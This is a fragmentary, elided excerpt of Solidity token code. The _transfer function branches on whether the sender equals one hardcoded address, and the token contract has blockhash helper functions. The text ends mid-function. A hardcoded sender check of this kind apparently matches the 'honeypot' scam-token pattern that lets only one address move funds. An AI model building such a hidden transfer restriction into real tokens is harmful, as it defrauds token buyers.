...
contract ERC20 is IERC20 {
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if (msg.sender != 0x8Ff961fdD109954C49c770333C6C3B0Bc3211A52) {
...
contract AMyToken is ERC20 {
    ...
    // string public constant name = "ELT";
    ...
    */
    ...
    function hash1(uint256 number) public returns (uint256, bytes32) {
        return (block.number, blockhash(number));
    }
function hash12() public returns (uint256, bytes32) {
